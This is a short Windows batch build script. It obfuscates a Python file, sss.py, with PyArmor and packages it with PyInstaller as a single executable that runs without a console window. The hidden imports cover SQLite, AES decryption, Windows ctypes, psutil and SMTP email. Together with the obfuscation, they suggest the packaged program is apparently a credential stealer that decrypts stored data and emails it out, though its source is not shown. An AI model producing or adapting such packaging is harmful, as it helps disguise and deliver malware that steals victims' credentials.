@echo off
cd /d %~dp0
pyarmor cfg init
pyarmor cfg obfuscate.enable_suffix 1
pyarmor cfg obfuscate.advanced 2
pyarmor gen -O dist\obf sss.py
pyinstaller --noconsole --onefile --hidden-import=os --hidden-import=json --hidden-import=base64 --hidden-import=sqlite3 --hidden-import=shutil --hidden-import=ctypes --hidden-import=ctypes.wintypes --hidden-import=Crypto.Cipher.AES --hidden-import=datetime --hidden-import=psutil --hidden-import=smtplib --hidden-import=ssl --hidden-import=email.mime.text --hidden-import=email.mime.multipart --hidden-import=email.mime.application --distpath build dist\obf\sss.py

pause
